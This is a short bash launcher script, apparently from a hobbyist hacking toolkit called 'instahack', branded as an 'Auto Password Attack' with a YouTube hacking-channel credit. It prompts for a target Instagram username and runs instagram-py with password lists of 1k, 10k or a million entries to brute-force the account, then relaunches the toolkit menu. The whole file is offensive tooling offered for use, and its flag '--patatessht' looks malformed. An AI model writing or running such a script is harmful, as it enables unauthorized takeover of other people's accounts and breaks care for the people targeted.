#wordlist selection.
grn='\033[1;32m'
red='\033[1;31m'
rset='\033[0m'
ylo='\033[1;33m'
#!/bin/bash
#coding section starts :)
clear
echo
echo '                    _                 _   
 o                       | |               | |  
     _  _    , _|_  __,  | |     __,   __  | |  
 |  / |/ |  / \_|  /  |  |/ \   /  |  /    |/_) 
 |_/  |  |_/ \/ |_/\_/|_/|   |_/\_/|_/\___/| \_/
            [#] Auto Password Attack [#]
' |lolcat
printf "\n"
printf "                \e[101m\e[1;77m  >>  Script By EvilDevil W A S I << \e[0m\n"
printf "\n"
printf "  \e[100m\e[1;77m >>  Youtube Channel : \e[1;96m youtube.com/Hackerwasi \e[100m\e[1;77m << \e[0m\n"
printf "\n"
echo
read -p "[#] User Name : " usrnm
echo
echo -e "$grn              [+]$red Type$ylo 1$red FOR 1k Passwords$grn
              [+]$red Type$ylo 2$red FOR 10K Passwords$grn
              [+]$red Type$ylo 3$red FOR 1Million Passwords $rset"
echo
read -p "[#] Enter Selected Number: " marks
echo 
if [ $marks = 1 ]
then
    instagram-py --patatessht $usrnm --password-list $HOME/instahack/pass/pass1.txt 
 
elif [ $marks = 2 ]
then
    instagram-py --patatessht $usrnm --password-list $HOME/instahack/pass/pass2.txt
 
elif [ $marks = 3 ]
then
    instagram-py --patatessht $usrnm --password-list $HOME/instahack/pass/pass3.txt
else
echo
echo -e  "$ylo >>> exiting........! Bye Bye :) <<<$rset"
echo
sleep 1.0
cd $HOME
fi
sleep 10.0
cd $HOME/instahack
bash instahack.sh
